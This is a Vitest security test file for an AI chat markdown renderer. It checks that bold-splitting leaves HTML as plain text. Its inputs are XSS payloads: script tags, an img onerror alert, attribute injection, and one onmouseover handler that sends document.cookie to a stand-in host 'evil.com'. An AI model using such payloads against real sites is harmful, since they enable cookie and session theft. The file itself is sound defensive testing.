import { describe, it, expect } from 'vitest';

/**
 * XSS Prevention — renderMarkdown security tests
 *
 * Validates that the AI chat markdown renderer does not allow
 * script injection through AI-generated content.
 */

describe('XSS Prevention — Markdown Renderer', () => {
  // Simulate the safe renderBold logic
  const renderBold = (line: string): { type: 'text' | 'bold'; content: string }[] => {
    const parts = line.split(/\*\*(.+?)\*\*/g);
    return parts.map((part, j) => ({
      type: j % 2 === 1 ? 'bold' as const : 'text' as const,
      content: part,
    }));
  };

  it('should render plain text without modification', () => {
    const result = renderBold('Hello world');
    expect(result).toEqual([{ type: 'text', content: 'Hello world' }]);
  });

  it('should split bold segments correctly', () => {
    const result = renderBold('Hello **bold** world');
    expect(result).toEqual([
      { type: 'text', content: 'Hello ' },
      { type: 'bold', content: 'bold' },
      { type: 'text', content: ' world' },
    ]);
  });

  it('should treat HTML tags as plain text (no injection)', () => {
    const malicious = 'Hello <script>alert("xss")</script> world';
    const result = renderBold(malicious);
    // The entire string should be treated as text, not parsed as HTML
    expect(result[0].content).toContain('<script>');
    expect(result[0].type).toBe('text');
  });

  it('should not execute img onerror payloads', () => {
    const malicious = '**<img src=x onerror=alert(1)>**';
    const result = renderBold(malicious);
    // The content inside bold should be treated as text
    const boldPart = result.find(r => r.type === 'bold');
    expect(boldPart?.content).toBe('<img src=x onerror=alert(1)>');
    // React will escape this when rendering as text content
  });

  it('should not allow event handler injection via bold', () => {
    const malicious = '**Hello" onclick="alert(1)**';
    const result = renderBold(malicious);
    const boldPart = result.find(r => r.type === 'bold');
    expect(boldPart?.content).toContain('onclick');
    // This is safe because React renders it as text, not innerHTML
  });

  it('should handle nested HTML attempts', () => {
    const malicious = '<div onmouseover="fetch(`evil.com?c=`+document.cookie)">hover me</div>';
    const result = renderBold(malicious);
    expect(result[0].type).toBe('text');
    expect(result[0].content).toContain('onmouseover');
  });

  it('should handle multiple bold segments with injections', () => {
    const malicious = '**safe** and <script>evil</script> and **also safe**';
    const result = renderBold(malicious);
    expect(result.length).toBe(5);
    expect(result[0].type).toBe('text');
    expect(result[1].type).toBe('bold');
    expect(result[1].content).toBe('safe');
    expect(result[2].type).toBe('text');
    expect(result[2].content).toContain('<script>');
    expect(result[3].type).toBe('bold');
    expect(result[3].content).toBe('also safe');
  });
});
